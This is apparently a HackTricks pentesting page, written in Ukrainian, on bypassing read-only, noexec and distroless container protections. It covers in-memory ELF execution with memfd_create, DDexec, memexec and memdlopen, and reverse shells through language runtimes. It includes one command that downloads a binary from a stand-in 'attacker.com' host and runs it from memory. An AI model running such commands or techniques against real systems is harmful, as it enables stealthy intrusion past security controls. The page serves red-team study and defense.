# Обхід захисту FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Відео

У наступних відео детальніше пояснюються методи, згадані на цій сторінці:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Сценарій read-only / no-exec

У контейнері кореневу файлову систему можна змонтувати лише для читання, задавши **`readOnlyRootFilesystem: true`** у контексті безпеки.<sup>[[3]](#references)</sup> Наприклад:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Коренева файлова система лише для читання не робить окремо змонтовані томи доступними лише для читання. Docker розглядає **`/dev/shm`** як IPC-монтування, а параметри tmpfs, як-от `rw` і `noexec`, є варіантами конфігурації середовища виконання; перш ніж покладатися на будь-яку з цих властивостей, перевірте параметри монтування цільового контейнера.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> З погляду red-team, така комбінація може ускладнити завантаження та виконання бінарних файлів, яких ще немає в системі (наприклад, бекдорів або інструментів для збору даних).<sup>[[4]](#references)[[5]](#references)</sup>

## Найпростіший обхід: скрипти

Монтування `noexec` блокує безпосередній запуск бінарних файлів із цього монтування, але інтерпретатор усе ще може читати та виконувати скрипт. Тому, якщо наявний `sh` або `python`, скрипт оболонки чи Python можна запустити через відповідний інтерпретатор.<sup>[[5]](#references)</sup>

Це не допоможе, якщо потрібний інструмент сам є бінарним файлом.<sup>[[5]](#references)</sup>

## Обхід через пам’ять

Якщо безпосередній запуск із змонтованого шляху заблоковано, можна завантажити ELF у пам’ять і виконати його через шлях у пам’яті. Це обходить перевірку `noexec` для цього монтування, але не скасовує інших обмежень ядра, дозволів чи політик.<sup>[[5]](#references)[[6]](#references)</sup>

### Обхід через FD + системний виклик exec

Якщо середовище виконання скриптів може отримати доступ до відповідного інтерфейсу Linux, воно може створити анонімний файловий дескриптор у RAM за допомогою **`memfd_create(2)`**, записати в нього байти ELF і скористатися шляхом виконання через fd. Проєкт [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) генерує стиснений код Python, Perl або Ruby, закодований у base64, для цього процесу.<sup>[[6]](#references)[[7]](#references)</sup>

Наразі проєкт документує цільові мови Python, Perl і Ruby; для PHP або Node потрібен інший специфічний для середовища виконання метод чи розширення. Тож відсутність генератора для певної мови не означає, що виконання з пам’яті неможливе.<sup>[[6]](#references)[[12]](#references)</sup>

Детальніше див. [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md), де ширше розглянуто виконання з анонімних файлів, пов’язані методи staging, а також виявлення та збір криміналістичних даних.

> [!WARNING]
> Звичайний виконуваний файл, записаний у **`/dev/shm`**, усе одно підпадає під дію параметра **`noexec`** цього монтування; просте відкриття через звичайний файловий дескриптор не змінює політику монтування.<sup>[[5]](#references)</sup>
>
> Конкретний метод виконання з пам’яті також залежить від середовища виконання, архітектури, ядра та доступних дозволів.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) записує stager і loader у процес запущеної оболонки через **`/proc/self/mem`**, а потім передає керування цьому коду.<sup>[[8]](#references)</sup>

Це дає процесу змогу завантажити переданий бінарний файл, не розміщуючи його попередньо у файловій системі з дозволом на виконання.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** може завантажувати й **виконувати** shellcode або бінарний файл із **пам’яті**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Докладніше про цю техніку дивіться на Github або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) — це реалізація DDexec у вигляді демона. Демон очікує на запити з аргументами та байтами програми, створює дочірній процес для завантаження й запуску кожної програми, а батьківський процес залишається сервером.<sup>[[9]](#references)</sup>

У репозиторії є приклад використання **memexec для запуску бінарних файлів із PHP reverse shell** у файлі [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Подібно до DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) — це безфайлова реалізація `dlopen()` для спільного об'єкта або програми. У README наразі описана підтримка ARM64, тому перед використанням перевірте архітектуру цільової системи.<sup>[[10]](#references)</sup>

## Обхід Distroless

Докладне пояснення **суті distroless**, випадків, коли він корисний або ні, та впливу на тактику post-exploitation у контейнерах дивіться тут:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Що таке distroless

Образи distroless містять лише застосунок і його залежності середовища виконання; в офіційних образах немає менеджерів пакетів, оболонок та інших програм, які зазвичай є у стандартному дистрибутиві Linux.<sup>[[11]](#references)</sup>

Якщо залишити в образі середовища виконання лише ці залежності, у production буде менше програмного забезпечення, яке потрібно сканувати й відстежувати.<sup>[[11]](#references)</sup>

### Reverse Shell

У distroless-контейнері ви можете **не знайти `sh` або `bash`** для звичайної оболонки, а також поширені утиліти на кшталт `ls`, `whoami` чи `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Тому звичайний reverse shell на основі оболонки або перерахування системи за допомогою утиліт можуть не спрацювати.<sup>[[11]](#references)</sup>

Якщо скомпрометований застосунок містить середовище виконання мови програмування (наприклад, Python для застосунку Flask або Node.js для застосунку Node), RCE усе ще може використовувати його для створення каналу команд і перевірки системи через API цього середовища.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Використовуйте наявну мову сценаріїв, щоб **перерахувати систему** за допомогою її можливостей.<sup>[[12]](#references)</sup>

Якщо захист **read-only/no-exec** відсутній, канал команд може записати бінарні файли у змонтовану файлову систему з правами на запис і виконання та запустити їх; спершу перевірте параметри монтування й дозволи.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Якщо такий захист увімкнено, використовуйте наведені вище **техніки виконання з пам'яті**, якщо це дозволяють середовище виконання, ядро та дозволи.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Приклади експлуатації вразливостей RCE для отримання **reverse shell** на основі мови сценаріїв і запуску бінарних файлів із пам'яті можна знайти в [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 — Дослідження маніпуляцій пам'яттю Linux для приховування та уникнення виявлення](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Приховані вторгнення з DDexec-ng і dlopen() у пам'яті — HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Налаштування контексту безпеки для Pod або контейнера](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
